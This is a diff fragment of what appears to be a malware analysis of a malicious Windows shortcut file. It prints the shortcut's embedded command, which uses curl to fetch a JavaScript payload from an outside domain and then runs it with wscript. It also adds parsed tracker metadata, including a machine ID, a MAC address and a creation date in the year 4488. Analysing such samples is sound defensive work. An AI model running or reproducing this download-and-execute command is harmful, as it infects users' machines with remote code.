@@ -14,6 +14,17 @@ lnk content:
 
 C:\Windows\System32\cmd.exe /q /c echo 'kjkc' && MD "%HOMEPATH%\xCUC3w\fkAdq" && curl.exe --output %HOMEPATH%\xCUC3w\fkAdq\EMss.N1.cSoZ.js https://primeaarvi.com/QUU/1209.html && echo "SP" && cd "%HOMEPATH%\xCUC3w\fkAdq" && wscript EMss.N1.cSoZ.js
 
+>> Tracker database block
+   Machine ID:  desktop-1u2nckw7
+   MAC Address: 4f:ac:e3:73:11:51
+   MAC Vendor:  (Unknown vendor)
+   Creation:    4488-06-14 13:43:35
+
+   Volume Droid:       62f89c00-1ea6-c4d1-4ea2-117a69fbd63d
+   Volume Droid Birth: 62f89c24-1ea6-c4d1-4ea2-117a69fbd63d
+   File Droid:         a4ccd3fc-a067-ecb9-118d-4face3731151
+   File Droid birth:   a4ccd3fc-a067-ecb9-118d-4face3731151
+
 *************************************************
 
 Exec >>
